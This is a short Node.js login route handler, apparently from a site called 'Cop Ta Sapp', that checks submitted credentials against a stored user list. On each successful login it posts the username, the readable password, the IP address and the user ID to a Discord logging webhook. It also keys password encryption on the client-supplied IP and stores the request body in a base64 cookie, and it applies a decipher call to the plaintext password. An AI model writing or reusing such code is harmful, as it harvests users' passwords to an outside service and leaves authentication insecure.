const
    { webhooks } = require("../../utils/config.json"),
    {
        jsonToBase64,
        sendWebhook,
        getTimeStamp,
        cipher,
        decipher
    } = require("../../utils/all.js");
module.exports = {
    path: "/connexion",
    method: "post",
    go: async (db, req, res) => {
        const
            { discord, u, m, ip } = req.body,
            alluser = db.get("user") || [],
            myCipher = cipher(String(ip.replaceAll(".", ""))),
            mdpCry = myCipher(m),
            existUser = alluser.filter(e => e.u.toLowerCase() == u.toLowerCase() && e.m == mdpCry && e.ip == ip)[0];

        if (!existUser) res.send("2");
        else {
            const
                myDecipher = decipher(String(ip.replaceAll(".", ""))),
                rm = myDecipher(m);
            req.body.m = mdpCry;
            db.set(`ip_${ip}`, req.body);
            res.cookie("connexion", jsonToBase64(req.body));
            req.body.discord = discord;
            if (discord) db.set(`userdiscord_${existUser.id}`, req.body);
            res.send("1");
            sendWebhook(webhooks.logs.loginregister, {
                username: "Cop Ta Sapp Logs - Connexion/Inscription",
                embeds: [
                    {
                        title: "New Connexion 👀",
                        color: 2201331,
                        fields: [
                            {
                                name: "`👤` User",
                                value: `\`\`\`User: ${u}\nMdp: ${rm} (${m})\nIp: ${ip}\nID: ${existUser?.id}\`\`\``
                            },
                            {
                                name: "`📆` Date",
                                value: getTimeStamp()
                            }
                        ]
                    }
                ]
            })
        };
    }
}